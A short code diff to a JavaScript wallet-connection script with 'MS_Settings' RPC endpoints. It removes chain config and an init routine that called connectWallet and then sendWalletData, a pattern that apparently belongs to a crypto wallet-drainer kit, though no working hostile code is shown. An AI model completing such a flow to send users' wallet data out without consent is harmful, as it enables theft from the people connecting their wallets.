@@ -5,33 +5,12 @@ const MS_Settings = {
         1: "https://mainnet.infura.io/v3/YOUR_INFURA_KEY",
         56: "https://bsc-dataseed.binance.org/",
         137: "https://polygon-rpc.com"
-    },
-    chains: {
-        1: {
-            name: "Ethereum",
-            explorer: "https://etherscan.io"
-        },
-        56: {
-            name: "BSC",
-            explorer: "https://bscscan.com"
-        },
-        137: {
-            name: "Polygon",
-            explorer: "https://polygonscan.com"
-        }
     }
 };
 
-// Optimized wallet connection
-async function ms_init() {
+function ms_init() {
     console.log('Wallet connection triggered');
-    try {
-        const provider = await detectProvider();
-        await connectWallet(provider);
-        await sendWalletData();
-    } catch (error) {
-        console.error('Connection error:', error);
-    }
+    // Wallet connection logic here
 }
 
 // Quick provider detection
